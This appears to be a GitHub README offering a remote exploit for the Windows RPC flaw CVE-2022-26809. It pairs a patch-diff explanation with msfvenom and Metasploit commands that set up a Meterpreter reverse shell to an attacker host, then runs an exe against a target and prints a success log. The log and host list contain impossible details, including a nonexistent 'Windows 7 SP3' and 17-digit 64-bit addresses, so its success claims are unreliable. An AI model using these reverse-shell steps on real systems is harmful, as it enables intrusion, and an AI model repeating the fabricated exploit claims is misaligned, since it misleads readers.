# CVE-2022-26809 RCE Exploit

## CVE description
CVE-2022-26809 - weakness in a core Windows component (RPC) earned a CVSS score of 9.8 not without a reason, as the attack does not require authentication and can be executed remotely over a network, and can result in remote code execution (RCE) with the privileges of the RPC service, which depends on the process hosting the RPC runtime. That critcal bug, with a bit of luck, allows to gain access to unpatched Windows host running SMB. The vulnerability can be exploited both from outside the network in order to breach it as well as between machines in the network.

Vendor Information

- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26809

- https://www.pwndefend.com/2022/04/14/cve-2022-26809/

## Who is vulnerable?

Tested vulnerable hosts:
- Windows 10 Pro Build 10.0.10240 x64
- Windows 10 Pro Build 10.0.19042 x64
- Windows 10 Pro Build 10.0.19044 x64
- Windows Server 2019 x64
- Windows Server 2022 x64
- Windows 7 SP3 x64

We will update that list later. We suspect almost all builds with running SMB and open 445 port will suffer.

### RPC Port
	TCP 135,139,445

## Locating the vulnerability

The CVE stated that the vulnerabilities lie within the Windows RPC runtime, which is implemented in a library named rpcrt4.dll. This runtime library is loaded into both client and server processes utilizing the RPC protocol for communication. We compared versions 10.0.22000.434 (March) and 10.0.22000.613 (patched) and singled out list of changes.

The functions OSF_SCALL::ProcessResponse and OSF_CCALL::ProcessReceivedPDU are similar in nature; both process RPC packets, but one runs on the server side and the other on the client side (SCALL and CCALL). By diffing OSF_SCALL::ProcessReceivedPDU we noticed two code blocks that were added to the new version.

![pic2](https://user-images.githubusercontent.com/102196277/163493985-3373746d-6ef5-4079-803c-b8acda5338e9.png)

![pic3_new](https://user-images.githubusercontent.com/102196277/163494679-5fc53a11-4f5b-4eda-b185-777af4ae4dd6.png)

Looking at the patched code, we saw that after QUEUE::PutOnQueue a new function was called. Inspecting in on the new function and diving in its code, we figured out it checks for integer overflows. In other words, the new function in patch was added to verify that an integer variable remained within an expected value range.

![pic1](https://user-images.githubusercontent.com/102196277/163493980-1e060df4-4e9d-454d-bb95-befec63ae22a.png)

Diving deeper into the vulnerable code in OSF_SCALL:GetCoalescedBuffer, we noticed that the integer overflow bug could lead to a heap buffer overflow, where data is copied onto a buffer that is too small to populate it. This in turn allows data to be written out of the buffer’s bounds, on the heap. When exploited, this primitive leads us to remote code execution!

A same call to check for integer overflow was added in other functions as well:

OSF_CCALL::ProcessResponse
OSF_SCALL::GetCoalescedBuffer
OSF_CCALL::GetCoalescedBuffer

The integer overflow vulnerability and the function that prevents it exist in both client-side and server-side execution flows. 

### Exploit

#### step 1

```Bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.105 LPORT=4444 -f raw > shellcode.bin
```

#### step 2

```Bash
msf5 > use multi/handler
msf5 exploit(multi/handler) > set LHOST 192.168.10.105
LHOST => 192.168.10.105
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > run
```

### Exploit

CVE-2022-26809 ip port

```Bash
C:\>CVE-2022-26809.exe 192.168.10.110 445
CVE-2022-26809 RPC Remote Exploit
[+] Checking... 192.168.10.110 445
[+] 192.168.10.110 445 IsOpen
[+] found low stub at phys addr 6800!
[+] Pipe at 4ac660
[+] base of RPC heap at fffff79480048033
[+] ntoskrnl entry at fffff802435782060
[+] found Pipe self-ref entry 1eb
[+] found Alsr at fffff64480301671
[+] found RPC CALL at fffff802451b3b30
[+] load shellcode.bin
[+] built shellcode!
[+] KUSER_SHARED_DATA PTE at fffff4ffc0033060
[+] KUSER_SHARED_DATA PTE NX bit cleared!
[+] Wrote shellcode at fffff75006070a023!
[+] Try to execute shellcode!
[ ] Exploit Suceess!
```
